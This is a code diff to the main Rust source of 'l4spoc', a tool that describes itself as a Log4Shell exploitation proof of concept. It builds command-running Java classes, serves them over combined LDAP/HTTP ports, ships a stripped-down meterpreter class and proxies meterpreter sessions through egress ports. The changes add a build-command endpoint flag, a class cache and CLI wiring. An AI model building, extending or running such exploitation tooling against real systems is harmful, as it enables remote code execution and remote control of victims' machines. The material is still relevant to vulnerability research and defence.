@@ -7,7 +7,7 @@ mod common;
 mod multiplexed;
 mod tcp_proxy;
 
-use common::{RunServerCfg, BuildCmdCfg};
+use common::{RunServerCfg, BuildCmdCfg, ClassCache};
 use std::fs;
 use get_if_addrs::{IfAddr, get_if_addrs};
 use clap::{Arg, Command, ArgMatches};
@@ -15,6 +15,7 @@ use clap::{Arg, Command, ArgMatches};
 #[tokio::main]
 async fn main() -> () {
     let matches = Command::new("l4spoc")
+        .subcommand_required(true)
         .version("0.8.0")
         .author("Walter Szewelanczyk. <walterszewelanczyk@gmail.com>")
         .about("This is a Rust based POC to show the \"Log4Shell\" vulnerability in log4j.  This can create command based jars for exploiting and also has a stripped down meterpreter class that will run in a thread of the exploited process.  This hosts the ldap server and the http server from the same port.  You can run on multiple ports simultaneously to attempt to see what ports may be available for egress on the target machine.  This version adds a proxy option.  If the request is not LDAP or HTTP it can then proxy the request to another machine, again on the same port.  If the target machine has only one egress port you can server LDAP, HTTP and use the same port to proxy the meterpreter connection to another local port or another machine.")
@@ -91,20 +92,30 @@ async fn main() -> () {
                 .long("wwwroot")
                 .default_value("wwwroot")
                 .takes_value(true)
-                .help("The dir to serve the payloads from.  Will create if it doesn't exist.  Note this should be the same build_path you used for any build_cmd classes.  You can also put in any other classes into this dir.")
-            ))
-        .get_matches();
+                .help("The dir to serve the payloads from.  Will create if it doesn't exist.  Note this should be the same build_path you used for any build_cmd classes.  You can also put in any other classes into this dir."))
+            .arg(Arg::new("allow_cmd")
+                .long("allow_cmd")
+                .takes_value(false)
+                .help("Allow build_cmd post end point")
+            )).get_matches();
 
     if let Some(m) = matches.subcommand_matches("build"){
         let cfg : BuildCmdCfg = convert_args_for_build_cmd(m);
-        fs::create_dir_all(&cfg.build_path)
-            .expect(&format!("Unable to create {} dir", cfg.build_path));    
-
-        build_java::build_exec_cmd_class(cfg).expect("faild to build cmd");
+        let build_path = m.value_of_t_or_exit("build_path");
+        fs::create_dir_all(&build_path)
+            .expect(&format!("Unable to create {} dir", &build_path));    
+        build_java::build_and_save_cmd_class(build_path, cfg).expect("faild to build cmd");
     } else if let Some(m) = matches.subcommand_matches("run"){
         let cfgs = convert_args_for_run_server_cfg(m);
+//        let build_cfg = BuildCmdCfg{
+//            class_name : "Test".to_string(),
+//            l_cmd : Some("firefox cvs.com".to_string()),
+//            w_cmd : Some("".to_string()),
+//        };
+//        let the_class = build_java::build_cmd_class(build_cfg);
+//        cfgs.class_cache.set_class("Test.class".to_string(),the_class);
         run_servers(cfgs).await;
-    }
+    } 
 }
 
 fn get_default_ip_addr_str() -> String{
@@ -232,21 +243,23 @@ fn convert_args_for_run_server_cfg(m : &ArgMatches) -> RunServerCfg{
         ports_file_name : convert_option(m.value_of("Op")),
         failed_file_name : convert_option(m.value_of("Of")),
         proxy_addr : convert_option(m.value_of("proxy")),
+        class_cache : ClassCache::new(),
+        allow_build_cmd : m.is_present("allow_cmd"),
     }
 }
 
 async fn run_servers(rsc: RunServerCfg) -> () {
-    fs::create_dir_all(&rsc.web_root)
-        .expect(&format!("Unable to create {} dir", rsc.web_root));    
+//    fs::create_dir_all(&rsc.web_root)
+//        .expect(&format!("Unable to create {} dir", rsc.web_root));    
     println!("Address base : {}", &rsc.addr);
     multiplexed::run_multiplexed_servers(rsc).await;
 }
 
 fn convert_args_for_build_cmd(m : &ArgMatches) -> BuildCmdCfg {
     return BuildCmdCfg{
-        build_path : m.value_of_t_or_exit("build_path"),
+   //     build_path : m.value_of_t_or_exit("build_path"),
         class_name : m.value_of_t_or_exit("class_name"),
-        l_cmd : m.value_of_t_or_exit("linux_cmd"),
-        w_cmd : m.value_of_t_or_exit("windows_cmd")
+        l_cmd : Some(m.value_of_t_or_exit("linux_cmd")),
+        w_cmd : Some(m.value_of_t_or_exit("windows_cmd"))
     }
 }
